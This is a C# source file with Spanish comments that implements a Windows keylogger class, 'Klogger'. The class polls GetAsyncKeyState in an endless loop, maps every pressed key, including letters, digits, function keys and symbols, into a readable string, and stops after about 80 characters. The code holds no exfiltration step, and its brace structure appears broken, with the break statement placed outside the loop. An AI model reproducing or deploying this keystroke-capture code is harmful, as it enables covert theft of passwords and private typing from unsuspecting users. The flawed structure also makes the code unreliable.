
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace WinFormsApp2
{
    
    class Klogger
    {
        //importamos el archivo User32.dll que permite capturar teclas presionada o sin presionar
        [DllImport("User32.dll")]
        
        public static extern int GetAsyncKeyState(Int32 i);
        //variable donde almacenaremos las teclas presionadas
        private string captura = "";
        //declaramos esta variable como acceso publico para que otras clases accedan a el
        public string Captura { get => captura; set => captura = value; }
       
        public Klogger()
        {
            
            inicio();
        }


        // importamos la funcion que nos permite saber el estado de la tecla Bloq Mayus
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        //varible para convertir decimales a ascii
        int dec = 0;

        
        public void inicio()
        {
           
            
            Captura = "";
      
            while (true)
            {
                
                bool mayusActivado = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;

                
                for (int i = 8; i < 255; i++)
                {
                    //verificamos en cada una de la teclas si esta presionada o no
                    int ketState = GetAsyncKeyState(i);
                    
                    if (ketState == 32769)      
                        
                        
                        //capturamos solo las letras del alfabeto en mayusculas, sin la ñ/Ñ
                        if (mayusActivado == true && i != 192 && i > 64 && i < 91) { Captura = Captura + "." + ((char)i); }
                        
                        
                        //capturamos solo la Ñ mayuscula
                        else if (mayusActivado == true && i == 192) { Captura += ".Ñ"; }
                        //capturamos solo la ñ minuscula
                        else if (mayusActivado == false && i == 192) { Captura += ".ñ"; }



                        //capturamos todas la letras del alfabeto en minuscula y las convertimos a ascii
                        else if (mayusActivado == false && i != 192 && i > 64 && i < 91) { dec = i + 32; Captura += "." + ((char)dec); }
                        //capturamos los numeros del teclado, los convertimos a ascii
                        else if (i > 95 && i < 106) { int te = i - 48; Captura += "." + ((char)te); }
                        //capturamos las teclas de funcion y identificamos el numero de la funcion
                        else if (i > 111 && i < 127 && i != 121) { Captura += ".F" + (i - 111); }
                        //reconocemos manualmente los caracteres especiales del teclado
                        else if (i == 106) { Captura += ".*"; }
                        else if (i == 107) { Captura += ".+"; }
                        else if (i == 13) { Captura += ".intro"; }
                        else if (i == 109) { Captura += ".-"; }
                        else if (i == 110) { Captura += ".."; }
                        else if (i == 111) { Captura += "./"; }
                        else if (i == 32) { Captura += ".espacio"; }
                        else if (i == 8) { Captura += ".borrar"; }
                        else if (i == 9) { Captura += ".tab"; }
                        else if (i == 16) { Captura += ".shift"; }
                        else if (i == 17) { Captura += ".control"; }
                        else if (i == 20) { Captura += ".bloqMayus"; }
                        else if (i == 27) { Captura += ".Esc"; }
                        else if (i == 33) { Captura += ".rePag"; }
                        else if (i == 34) { Captura += ".avPag"; }
                        else if (i == 35) { Captura += ".fin"; }
                        else if (i == 36) { Captura += ".inicio"; }
                        else if (i == 37) { Captura += ".←"; }
                        else if (i == 38) { Captura += ".↑"; }
                        else if (i == 39) { Captura += ".→"; }
                        else if (i == 40) { Captura += ".↓"; }
                        else if (i == 45) { Captura += ".insert"; }
                        else if (i == 46) { Captura += ".supr"; }
                        else if (i == 49) { Captura += ".!"; }
                        else if (i == 50) { Captura += ".comillDoble"; }
                        else if (i == 51) { Captura += ".#"; }
                        else if (i == 52) { Captura += ".$"; }
                        else if (i == 53) { Captura += ".%"; }
                        else if (i == 54) { Captura += ".&"; }
                        else if (i == 55) { Captura += "./"; }
                        else if (i == 56) { Captura += ".("; }
                        else if (i == 57) { Captura += ".)"; }
                        else if (i == 48) { Captura += ".="; }
                        else if (i == 219) { Captura += ".?"; }
                        else if (i == 221) { Captura += ".¿"; }
                        else if (i == 59) { Captura += "./"; }
                        else if (i == 220) { Captura += ".|"; }
                        else if (i == 144) { Captura += ".bloqNum"; }
                        else if (i == 91) { Captura += ".windows"; }

                    }
                }
                //con este if controlamos que luego de 80 teclas capturadas termine el bucle
                if (Captura.Length > 80)
                {
                    //rompemos el bucle infinito
                    break;
                }
            }
        }
    }
}